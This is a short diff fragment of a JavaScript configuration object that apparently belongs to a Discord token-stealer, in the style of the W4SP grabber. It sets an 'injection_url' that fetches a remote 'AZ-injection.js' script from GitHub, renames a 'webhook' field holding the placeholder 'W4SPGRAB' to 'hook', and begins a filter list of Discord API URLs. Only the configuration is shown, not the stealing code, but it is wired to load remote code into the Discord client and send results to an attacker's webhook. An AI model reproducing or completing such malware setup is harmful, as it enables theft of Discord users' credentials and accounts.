@@ -16,7 +16,7 @@ var config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/AZbngg/injection/main/AZ-injection.js",
-    webhook: "W4SPGRAB",
+    hook: "W4SPGRAB",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
